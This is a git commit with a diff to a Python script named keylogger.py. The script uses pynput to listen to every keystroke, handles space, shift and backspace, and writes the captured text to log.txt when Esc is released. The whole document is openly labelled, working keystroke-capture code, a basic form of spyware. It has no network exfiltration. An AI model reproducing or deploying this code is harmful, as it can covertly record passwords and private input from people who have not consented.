029665879572560f3765fee062f507bbc0498575
dsxz19-2 <87105182+dsxz19-2@users.noreply.github.com>
2022-08-10 16:01:14 -0400

    Update keylogger.py

--- keylogger.py
+++ keylogger.py
@@ -1,6 +1,6 @@
 import pynput
-
 from pynput.keyboard import Key, Listener
+
 
 count = 0
 keys = []
@@ -8,22 +8,24 @@ keys = []
 def on_press(key):
 	global keys, count
 
-	keys.append(key)
-	count += 1
-
-	if count >= 1:
-		count = 0
-		write_file(keys)
-		keys = []
-
-def write_file(keys):
-	with open("log.txt", "a") as f:
-		for key in keys:
-			f.write(str(key))
+	if key == Key.esc:
+		pass
+	elif key == Key.shift:
+		pass
+	elif key == Key.backspace:
+		keys.pop()
+	elif key == Key.space:
+		keys.append(' ')
+	else:
+		keys.append(key)
 
 def on_release(key):
 	if key == Key.esc:
-		return Flase
+		with open("log.txt", "w") as f:
+			for i in range(len(keys)):
+				f.write(str(keys[i]).replace("'", ""))
+		f.close()
+		return False
 
 with Listener(on_press=on_press, on_release=on_release) as listener:
 	listener.join()
